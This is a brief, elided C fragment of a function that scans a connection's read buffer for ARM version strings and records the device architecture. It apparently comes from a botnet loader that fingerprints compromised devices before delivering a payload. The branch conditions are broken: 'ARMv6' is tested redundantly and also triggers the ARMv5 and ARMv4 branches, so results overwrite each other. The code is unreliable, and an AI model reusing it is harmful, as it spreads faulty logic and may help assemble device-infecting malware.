...
int connection_consume_arm_subtype(struct connection *conn)
{
    ...
    }if(util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1 || util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
    {
        #ifdef DEBUG
            printf("[FD%d] Arch has ARMv6!\n", conn->fd);
        #endif
        strcpy(conn->info.arch, "arm6");
    }if(util_memsearch(conn->rdbuf, offset, "ARMv5", 5) != -1 || util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
    {
        #ifdef DEBUG
            printf("[FD%d] Arch has ARMv5!\n", conn->fd);
        #endif
        strcpy(conn->info.arch, "arm5");
    }if(util_memsearch(conn->rdbuf, offset, "ARMv4", 5) != -1 || util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
    {
        #ifdef DEBUG
            printf("[FD%d] Arch has ARMv4!\n", conn->fd);
        #endif
